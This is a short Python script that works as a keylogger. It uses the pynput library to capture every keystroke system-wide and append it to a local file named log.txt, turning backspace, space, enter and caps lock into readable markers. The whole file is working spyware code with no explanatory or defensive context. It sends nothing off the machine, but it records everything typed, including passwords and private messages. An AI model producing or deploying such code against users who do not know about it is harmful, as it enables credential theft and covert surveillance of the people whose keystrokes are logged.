from pynput.keyboard import Listener


def log_keystroke(key):
    key = str(key).replace("'", "")

    if key.startswith("Key."):
        if key == "Key.backspace":
            key = ' BACKSPACE '
        elif key == 'Key.space':
            key = ' '
        elif key == "Key.enter":
            key = '\n'
        elif key == 'Key.caps_lock':
            key = ' CAPS_LOCKED '
        else:
            key = ''

    with open("log.txt", 'a') as f:
        f.write(key)

with Listener(on_press=log_keystroke) as l:
    l.join()